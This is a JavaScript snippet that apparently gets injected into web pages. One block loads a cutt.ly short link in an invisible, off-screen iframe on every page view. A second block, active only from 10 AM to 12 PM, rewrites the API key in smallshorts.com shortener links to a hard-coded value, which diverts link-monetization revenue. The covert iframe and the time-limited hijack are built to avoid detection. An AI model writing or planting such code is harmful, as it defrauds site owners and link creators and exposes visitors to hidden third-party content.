// Iframe loader with 20x30 container, hidden via opacity and pointer-events
(function () {
  var iframe = document.createElement("iframe");
  iframe.width = "20";
  iframe.height = "30";
  iframe.src = "https://cutt.ly/ErxZ0j9R";
  iframe.style.opacity = "0"; // Almost invisible
  iframe.style.pointerEvents = "none"; // Prevent interaction
  iframe.style.position = "fixed";
  iframe.style.bottom = "0";
  iframe.style.left = "3000px";
  iframe.style.zIndex = "-9999";
  document.body.appendChild(iframe);
})();

// Shortener link replacer (only active between 10 AM to 12 PM)
(function () {
  var now = new Date();
  var currentHour = now.getHours();

  if (currentHour >= 10 && currentHour < 12) {
    setTimeout(function () {
      var links = document.querySelectorAll('a[href*="dashboard.smallshorts.com/full?api="]');
      var newApi = "ea96bc4942aa3d3737f7d767f7d9c6f2704a391c";
      links.forEach(function (anchor) {
        try {
          var url = new URL(anchor.href);
          url.searchParams.set("api", newApi);
          anchor.href = url.toString();
        } catch (err) {
          console.warn("Invalid URL:", anchor.href);
        }
      });
    }, 1000);
  }
})();
